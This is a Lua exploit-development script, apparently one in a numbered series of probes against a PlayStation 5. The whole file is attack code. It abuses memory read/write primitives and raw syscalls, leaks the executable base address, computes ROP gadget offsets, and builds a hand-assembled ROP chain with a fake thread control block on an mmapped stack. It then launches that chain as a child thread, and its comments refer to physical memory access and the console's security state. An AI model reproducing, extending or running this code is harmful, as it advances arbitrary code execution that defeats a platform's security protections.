-- CRASH_CLASS: LOW
-- PROBE 562t: Baseline child thread test — do old patterns still work clean?
--
-- 562s disproved the MapDM ordering hypothesis: trace blocks appear
-- during chain construction BEFORE MapDM. Need to know if the
-- trace is now happening for ALL child thread ROP chains, or only
-- in the 562 series probes.
--
-- This probe replicates the 384b pattern (CONFIRMED WORKING):
-- child does getpid via fn_addr, writes result to shared, exits.
-- NO MapDM, NO physical memory access. Pure baseline.
-- If this produces trace blocks, the PS5 security state has changed.

print("=== PROBE 562t: BASELINE CHILD THREAD ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rb(a)
    local d = rd(a); if d == nil then return nil end
    if d < 0 then d = d + 0x100000000 end; return d
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local Z = uint64(0)
local sc477 = mk(477)
local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(Z, ib) end)
local elo = rd(N(ib) + 0x108) or 0; local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

print(string.format("eb=0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67
io.flush()

-- Shared buffer
local shared = memory.alloc(0x20)
local sh = N(shared)
wq(sh, Z)

-- Mmap stack
print("[A] mmap stack")
local ss = 0x4000
local ok_stk, sb_raw = pcall(function()
    return sc477(Z, uint64(ss), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), Z)
end)
local sb = N(sb_raw)
local rsp = sb + ss - ((sb + ss) % 16) - 8
print(string.format("  stack at 0x%X, rsp=0x%X", sb, rsp))
io.flush()

-- Build chain: sysarch + getpid + write result + thr_exit
print("[B] building chain")
io.flush()

-- Fake TCB
local tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb) + i, 0) end
wq(N(tcb), uint64(N(tcb)))
local fsb = memory.alloc(8)
wq(N(fsb), uint64(N(tcb)))

local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

-- sysarch(SET_FSBASE=129)
emit(g_pop_rdi); emit(uint64(129))
emit(g_pop_rsi); emit(uint64(N(fsb)))
emit(g_pop_rax); emit(uint64(165))
emit(stub)

-- getpid → rax
emit(g_pop_rax); emit(uint64(20))
emit(stub)

-- write rax → shared
emit(g_pop_rdi); emit(uint64(sh))
emit(g_mov_m_rax)

-- sentinel 0xDEAD → shared+8
emit(g_pop_rax); emit(uint64("0xDEADDEADDEADDEAD"))
emit(g_pop_rdi); emit(uint64(sh + 8))
emit(g_mov_m_rax)

-- thr_exit(0)
emit(g_pop_rdi); emit(Z)
emit(g_pop_rax); emit(uint64(431))
emit(stub)

print(string.format("  %d entries", off/8))
io.flush()

-- thr_param
local pa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
wq(N(pa), g_bare_ret)
wq(N(pa) + 0x10, uint64(sb))
wq(N(pa) + 0x18, uint64(ss))
local tid_buf = memory.alloc(8); wq(N(tid_buf), Z)
wq(N(pa) + 0x30, tid_buf)

-- Spawn
print("[C] spawning child")
io.flush()
local ok_s, rv_s = pcall(function() return mk(455)(pa, uint64(0x38)) end)
print("ret=" .. (ok_s and N(rv_s) or -999))
io.flush()

-- Wait and poll
for i = 1, 200000 do
    local sv = rb(sh + 8)
    if sv and sv == 0xDEADDEAD then
        local child_pid = rb(sh) or 0
        print(string.format("child_pid=0x%X sentinel=OK iter=%d", child_pid, i))
        break
    end
end

-- Final check
local sv = rb(sh + 8) or 0
local cp = rb(sh) or 0
print(string.format("shared: pid=0x%X sentinel=0x%X", cp, sv))
print("pid=" .. pid_val .. " ALIVE")
print("=== 562t DONE ===")
